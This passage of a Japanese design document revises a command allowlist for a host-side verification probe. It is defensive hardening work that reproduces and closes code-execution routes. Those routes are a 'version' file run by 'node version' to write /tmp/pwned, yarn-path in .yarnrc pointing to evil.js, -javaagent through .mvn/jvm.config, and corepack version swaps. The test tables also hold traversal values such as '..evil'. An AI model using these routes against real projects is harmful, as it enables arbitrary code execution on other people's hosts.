| V18 | `npx --no-install ../eslint --version` | 実行されない |
| V19 | `npx --no-install @scope/pkg --version` | **形式検査を通る**(スコープ付きパッケージの正当形。未インストールなので実行は失敗し `exit 3` になるが、`検証プローブを実行します:` が出れば合格) |
| V20 | `npx --no-install eslint --version` | **通る**(退行なし) |
| V21 | `python3 -I -m ..evil --version` | 実行されない |

V1〜V16 も再実行して退行が無いことを確認する。

---

## 15. 改訂(検収 round 4 の Critical 対応)

### 15.1 指摘と実測

**根本原因は `PROBE_VERIFY_TOKENS` に入れた裸の `version`(ダッシュなし)。**
多くの処理系は「未知の位置引数 = 実行するスクリプトのパス / タスク名」と解釈する。
プローブは `cd "$ROOT"` した状態で走るので、**リポジトリ直下に `version` という名前の
ファイルを置くだけ**で任意コードが走る:

```
$ printf 'require("fs").writeFileSync("/tmp/pwned","NODE_VERSION_FILE_RAN")\n' > version
$ node version
$ cat /tmp/pwned
NODE_VERSION_FILE_RAN            ← 実測で再現
```

`python3 version` / `ruby version` も同型。`rake version` / `gradle version` は
**ファイル名の細工すら不要**で、タスク未検出を判定する前に `Rakefile` / `build.gradle` を
評価する(レビュー側の実機再現)。`version` は `FORBIDDEN_PATHS` のどれにも当たらない
普通のファイル名なので、委託先がそのまま置ける。

**§13.3 で受容した残存リスクとは別物。** あちらは「`node_modules/.bin` を差し替えられる
相手には、正しいプローブでもホスト実行される」という**プローブの仕事そのものと表裏一体**の
話だった。こちらは**トークンの選定ミス**で、正しい形のプローブが本来しないはずの
「cwd のファイルを実行する」に化けている。塞ぐ。

`-v` も外す: 多くのツールで verbose の意味になり、`python3 -v` は対話 REPL に落ちる
(委託が入力待ちで止まる)。`--help` / `-h` は導通確認としての価値が無く、
プラグイン機構を持つ CLI が cwd の設定を読む可能性を残すので同時に外す。

### 15.2 実装

**(1) `PROBE_VERIFY_TOKENS` を 2 つに絞る**(§2 の定数定義を差し替え):

```bash
# いずれか 1 つを末尾に要求する導通確認トークン。
#
# **裸の `version`(ダッシュなし)と `-v` / `-V` / `--help` / `-h` は入れない。**
# 裸の version は多くの処理系で「位置引数 = 実行するスクリプトのパス / タスク名」と
# 解釈され、cd "$ROOT" した状態のプローブがリポジトリ直下の `version` という
# ファイルを実行してしまう(実測: node version で version というファイルの中身が走る。
# rake / gradle はファイル名の細工すら不要で Rakefile / build.gradle を評価する)。
# -v は多くのツールで verbose の意味になり、python3 -v は対話 REPL に落ちて委託が止まる。
# --help / -h は導通確認としての価値が無い割に cwd の設定を読む CLI が残る。
# ダッシュ付きの --version / -version(java)だけなら、どの処理系も
# 「版を出して終わる」以外のことをしない。
PROBE_VERIFY_TOKENS="--version -version"
```

**(2) `go version` だけを例外として明示する。** `go` は `--version` を受け付けず
`go version` がサブコマンド(位置引数のファイルパスではない)なので、**完全一致で 1 形だけ**通す。
`probe_format_reason()` のトークン化直後、**「末尾は導通確認トークン」の検査より前**に置く:

```bash
  # go だけは `go version` がサブコマンド(go は --version を受け付けない)。
  # 位置引数のファイルパスとして解釈される余地が無いので、完全一致で 1 形だけ通す。
  if [ "$probe" = "go version" ]; then
    return 0
  fi
```

**(3) (c) のコメントの P1 の例を直す**: `node --version / go version` → `node --version / java -version`
(`go version` は上の特例として別に説明されるため、P1 の例から外す)。

### 15.3 ドキュメントの差し替え

**AGENTS.md §2** の該当箇条書き:

- 「`<確認フラグ>` は `--version` / `-version` / `-V` / `-v` / `version` / `--help` / `-h` のいずれかで、**必ず末尾**に置くこと」
  → 「`<確認フラグ>` は **`--version` または `-version`(Java 用)のみ**で、**必ず末尾**に置くこと。`version`(ダッシュなし)・`-v`・`--help` は使えません(ダッシュなしの `version` は多くの処理系で『カレントディレクトリの `version` というファイルを実行する』意味になるため)」
- P1 の例の行 `例: node --version / go version / cargo --version`
  → `例: node --version / cargo --version / java -version`
- 箇条書きに 1 項目足す: 「`go` だけは `go version` と書けます(`go` は `--version` を受け付けず、`version` が正規のサブコマンドのため)」

**CHANGELOG** の `[auto]` 項の末尾に 1 文足す:

```
確認フラグは `--version` / `-version` に限定しています(ダッシュなしの `version` は多くの処理系で「カレントディレクトリの `version` というファイルを実行する」意味になり、実測で任意コード実行に到達しました。例外は `go version` のみ)。
```

### 15.4 検証(追加)

| # | プローブ | 期待 |
| --- | --- | --- |
| V22 | `node version` + リポジトリ直下に `version` ファイルを置く | **実行されない**。`/tmp/pwned` が作られないことを確認する。**確認後 `version` ファイルを必ず削除する** |
| V23 | `python3 version` / `ruby version` / `rake version` / `gradle version` | すべて実行されない |
| V24 | `go version` | **形式検査を通る**(go 未インストール環境では実行が失敗し `exit 3` になるが、`検証プローブを実行します:` が出れば合格) |
| V25 | `java -version` | 形式検査を通る |
| V26 | `node -v` / `node --help` | **実行されない**(トークンから外したため) |
| V27 | `npx --no-install eslint --version` / `node --version` / `python3 -I -m pytest --version` | 通る(退行なし) |

V1〜V21 も再実行して退行が無いことを確認する(V6 等、理由文言が変わるものは文言差のみ許容)。

---

## 16. 改訂(検収 round 5 の Critical 対応)— 許可コマンドを実測済みのものだけに絞る

### 16.1 指摘と実測

`<cmd> --version` は「版を出して終わる」と暗黙に仮定していたが、**処理系のランチャーが
カレントディレクトリの設定ファイルを読んで、実行するコード自体を差し替える**ものがある。
すべてこのリポジトリの devcontainer で実測:

| コマンド | 経路 | 実測結果 |
| --- | --- | --- |
| `yarn --version` | `.yarnrc` の `yarn-path "./evil.js"` | `evil.js` が実行された(`YARN_PATH_RAN`) |
| `mvn --version` | `.mvn/jvm.config` | 中身が JVM 起動オプションに渡る(不正フラグで JVM 起動失敗を確認)。`-javaagent:` で `premain` が走る |
| `pnpm --version` | `package.json` の `packageManager` | システムの 11.15.1 ではなく **8.15.0** が実行された(corepack が版を差し替える) |

**これは r1〜r4 とは質が違う指摘。** これまでは「プローブ文字列の形」の問題だったが、
今回は**形は完全に正しいのに、コマンド自身がワークツリーの設定に従って別のコードを実行する**。
つまり `PROBE_ALLOWED_CMDS` に載せる判断そのものが検証されていなかった。

### 16.2 方針: 個別対処ではなく、許可リストを実測済みのものだけにする

`yarn` / `mvn` / `pnpm` を外すだけでは同じ間違いを繰り返す。**この環境で実測して
「ワークツリーの設定に影響されない」ことを確認できたコマンドだけ**を残し、
確認できなかったものは全部外す。

**検証方法(これを design に残すのが本題)**: 対象ディレクトリに各処理系の設定ファイル
(`.yarnrc` / `.npmrc` / `package.json` の `packageManager` / `Rakefile` / `build.gradle` /
`gradle.properties` / `.mvn/jvm.config`)と canary を書き出す JS/Ruby/Groovy を置き、
`env -i PATH=... HOME=... bash -c '<cmd> --version'` を実行して canary が作られないこと・
出力がシステム版と一致することを確認する。

**実測で安全を確認できたもの(残す)**: `node` `npm` `npx` `python` `python3` `ruby` `java` `rake` `gradle`

**外すもの**:

| 分類 | コマンド | 理由 |
| --- | --- | --- |
| 実測で危険 | `yarn` `mvn` `pnpm` | 上記のとおりワークツリーの設定で実行コードが変わる |
| この環境で検証不能 | `deno` `bun` `go` `cargo` `rustc` `dotnet` `php` `composer` `swift` `pip` `pip3` `uv` `poetry` `bundle` | 未インストールで実測できない。**検証できていないものを「安全」として載せない** |

**`go version` の特例も外す。** `go` は未インストールで検証できず、Go 1.21+ には
`go.mod` の `toolchain` ディレクティブで別のツールチェインを取得・実行する機構があるため、
「ワークツリーの設定で実行されるコードが変わる」類型に該当する可能性がある。
検証できるまで載せない。**`PROBE_VERIFY_TOKENS` は `--version -version` のまま**なので、
特例を消すと `go` 形はすべて形式外(警告 + スキップ)になる。

**外した処理系のプロジェクトはプローブが使えなくなる(警告 + スキップ)。**
委託は止まらないので実害は「導通確認が効かない」だけ。
**検証できていないものを通してホスト実行のリスクを負うより、この劣化を選ぶ。**
再追加は、上の検証方法で実測してから 1 行足せばよい。

### 16.3 実装

**(1) `PROBE_ALLOWED_CMDS` を差し替える**(§2 の定数):

```bash
# 第 1 トークンとして許可する実行コマンド。
#
# **この環境で実測し「ワークツリーの設定ファイルに影響されない」ことを確認したものだけ**
# を載せる。<cmd> --version は「版を出して終わる」と思いがちだが、実際には
# ランチャーがカレントの設定を読んで実行するコード自体を差し替えるものがある:
#   yarn  .yarnrc の yarn-path で任意の JS に委譲する(実測で任意コード実行)
#   mvn   .mvn/jvm.config が JVM 起動オプションに渡る(-javaagent: で premain が走る)
#   pnpm  package.json の packageManager で corepack が別バージョンを取得・実行する
# この 3 つは外した。未インストールで実測できなかったもの(deno bun go cargo rustc
# dotnet php composer swift pip uv poetry bundle)も、検証できていない以上載せない。
#
# **追加するときは必ず実測すること**: 作業ディレクトリに各処理系の設定ファイルと
# canary を書き出すスクリプトを置き、env -i PATH=... HOME=... bash -c '<cmd> --version'
# で canary が作られないこと・出力がシステム版と一致することを確認する(design §16.2)。
PROBE_ALLOWED_CMDS="node npm npx python python3 ruby java rake gradle"
```

**(2) `go version` の完全一致特例(§15.2 (2) で足したブロック)を削除する。**

**(3) `PROBE_ENV` に `COREPACK_ENABLE_NETWORK=0` を足す**(多重防御):

```bash
#   COREPACK_ENABLE_NETWORK=0  corepack が package.json の packageManager を見て
#                              別バージョンを取得・実行するのを止める(pnpm/yarn は
#                              許可リストから外したが、環境によっては npm/npx も
#                              corepack の shim になりうるため入れておく)
PROBE_ENV=("PATH=${PATH:-/usr/local/bin:/usr/bin:/bin}" "COREPACK_ENABLE_NETWORK=0")
for _pe in HOME TMPDIR; do
```

実測で `COREPACK_ENABLE_NETWORK=0` を付けても `npx --no-install eslint --version`
(`v10.8.1`)と `node --version`(`v24.18.0`)は変わらないことを確認済み。

### 16.4 ドキュメントの差し替え

**AGENTS.md §2**:

- 「`<コマンド>` は許可された言語ランタイム / パッケージマネージャのみ(`npx` `npm` `node` `python` `go` `cargo` `mvn` 等)」
  → 「`<コマンド>` は **`node` `npm` `npx` `python` `python3` `ruby` `java` `rake` `gradle` のみ**です。`yarn` / `pnpm` / `mvn` は使えません(`--version` でもワークツリーの設定ファイルに従って別のコードを実行するため)。ここに無い処理系のプロジェクトでは、プローブは警告つきでスキップされます(委託は続きます)」
- 「`go` だけは `go version` と書けます」の項目を**削除**する
- P1 の例から `go version` を消し、`node --version` / `java -version` / `rake --version` にする

**CHANGELOG** の `[auto]` 項の末尾に 1 文足す:

```
許可コマンドは実測で「ワークツリーの設定ファイルに影響されない」ことを確認した 9 つ(`node` `npm` `npx` `python` `python3` `ruby` `java` `rake` `gradle`)に限定しました。`yarn`(`.yarnrc` の `yarn-path`)・`mvn`(`.mvn/jvm.config`)・`pnpm`(`package.json` の `packageManager`)は、`--version` でもワークツリーの設定で実行されるコードが変わることを実測で確認したため除外しています。他の処理系のプロジェクトではプローブが警告つきでスキップされます(委託は止まりません)。
```

### 16.5 検証(追加)

| # | プローブ | 期待 |
| --- | --- | --- |
| V28 | `yarn --version` / `pnpm --version` / `mvn --version` | すべて**実行されない**(「許可されていないコマンドです」) |
| V29 | `go version` | **実行されない**(特例を外したため) |
| V30 | `node --version` / `java -version` / `rake --version` / `gradle --version` / `python3 --version` / `ruby --version` | 形式検査を通る |
| V31 | `npx --no-install eslint --version` / `python3 -I -m pytest --version` | 通る(退行なし) |
| V32 | `cargo --version` / `deno --version` | **実行されない**(許可リストから外したため) |

V1〜V27 も再実行して退行が無いことを確認する(`go version` を通していた V24 と、
`cargo --version` を通していた既存ケースは**期待値が「実行されない」に変わる**)。

---

## 17. 改訂(検収 round 6 の Major 対応)— 最終

round 6 で**再現可能な RCE 経路は「なし」**と確定した。残る 3 点はスペック整合と
検証範囲の一貫性の問題で、いずれも実測で確認済み。

### 17.1 `-version` を java 専用にする

`PROBE_VERIFY_TOKENS="--version -version"` は 9 コマンド全部に `-version` を許していたが、
コメントと `AGENTS.md` は「`-version` は Java 用」と説明していた。**実装が説明より広い。**
実測:

```
$ ruby -version    → NameError: undefined local variable or method `rsion'
$ rake -version    → 同上(Ruby の -v + -e に分解され、残り "rsion" が eval される)
$ python3 -version → Unknown option: -e
```

評価される文字列は固定リテラルで攻撃者が制御できないので **RCE ではない**が、
「`--version` / `-version` だけならどの処理系も版を出して終わる」というコメントは
**事実として誤り**。また §16.2 の「検証できていないものは載せない」を、コマンド単位では
守ってトークンの組み合わせ単位では守れていない。

**対処**: `PROBE_VERIFY_TOKENS="--version"` に絞り、`java -version` だけを完全一致の
特例にする(`go version` を消した §16.3 (2) と同じ形。ただしこちらは**実測済み**)。

```bash
# いずれか 1 つを末尾に要求する導通確認トークン。
# ... (裸の version / -v / --help を入れない理由は据え置き) ...
# `-version` はここに入れない。ruby / rake は -v + -e に分解して残り "rsion" を
# eval しようとして落ち、python3 は Unknown option になる(実測)。
# java だけは --version(Java 9+)も -version(従来形)も版を出して終わるので、
# `java -version` を下の完全一致特例で通す。
PROBE_VERIFY_TOKENS="--version"
```

`probe_format_reason()` のトークン化直後、末尾トークン検査より**前**に置く:

```bash
  # java だけは従来形の `java -version` も通す(実測で版を出して終わる)。
  # 他の処理系は -version を -v + -e に分解するため PROBE_VERIFY_TOKENS には入れない。
  if [ "$probe" = "java -version" ]; then
    return 0
  fi
```

### 17.2 `python` を許可リストから外す

`python` はこの環境に未インストールで実測できていない。§16.2 が `yarn` / `mvn` / `pnpm` や
`deno` / `go` / `cargo` を「未検証だから外す」と線引きした以上、`python` だけを
「`python3` と同じだから」と推定で通すのは基準の例外化になる。加えて **Python 2 には
`-I` が無い**(3.4 で追加)ので、P3 の安全性の根拠(`-I` が cwd の `sys.path` 挿入を止める)が
`python` = Python 2 の環境では成り立たない可能性がある。

**対処**:
- `PROBE_ALLOWED_CMDS="node npm npx python3 ruby java rake gradle"`(`python` を削除、8 個)
- P3 の第 1 トークン判定から `python` を外し、**`python3` のみ**にする:

```bash
    if [ "${parts[0]}" = "python3" ] && [ "${parts[1]}" = "-I" ] && [ "${parts[2]}" = "-m" ]; then
```

コメントに理由を 1 行残す:

```bash
#   python(python3 ではない)は外してある。実測できないうえ、Python 2 を指す環境では
#   P3 の根拠である -I(3.4 で追加)が無く、cwd の sys.path 挿入を止められない。
```

### 17.3 CHANGELOG の不整合を直す

`[auto]` 項に残っている 2 箇所:

1. 「例外は `go version` のみ」 → **削除**(§16.3 (2) で特例を消したため、実装のどこにも `go version` は無い)。あわせて「確認フラグは `--version` / `-version` に限定しています」→「確認フラグは `--version` に限定しています(`java -version` のみ従来形も通します)」
2. 「許可コマンドは…確認した 9 つ(`node` `npm` `npx` `python` `python3` `ruby` `java` `rake` `gradle`)」 → **8 つ**にし、`python` を削除する

### 17.4 AGENTS.md の差し替え

- 「`<確認フラグ>` は **`--version` または `-version`(Java 用)のみ**で…」
  → 「`<確認フラグ>` は **`--version` のみ**で、**必ず末尾**に置くこと。`version`(ダッシュなし)・`-v`・`--help` は使えません(ダッシュなしの `version` は多くの処理系で『カレントディレクトリの `version` というファイルを実行する』意味になるため)。**`java -version` だけは従来形として通ります**」
- 許可コマンドの列挙から `python` を削除し、**8 つ**にする
- P3 の例と説明を `python3` のみにする(`python` を消す)
- P1 の例に `java -version` が残っていてよい(特例で通るため)

### 17.5 検証(追加)

| # | プローブ | 期待 |
| --- | --- | --- |
| V33 | `java -version` | **通る**(特例) |
| V34 | `java --version` | 通る(P1) |
| V35 | `ruby -version` / `rake -version` / `python3 -version` / `node -version` | **すべて実行されない** |
| V36 | `python --version` / `python -I -m pytest --version` | **実行されない**(`python` を外したため) |
| V37 | `python3 -I -m pytest --version` / `python3 --version` | 通る(退行なし) |
| V38 | `npx --no-install eslint --version` / `node --version` / `ruby --version` / `rake --version` / `gradle --version` / `npm --version` | 通る(退行なし) |

V1〜V32 も再実行し、`-version` を使っていたケース(V25 の `java -version` は V33 に統合)と
`python` 系の期待値の変化以外に退行が無いことを確認する。
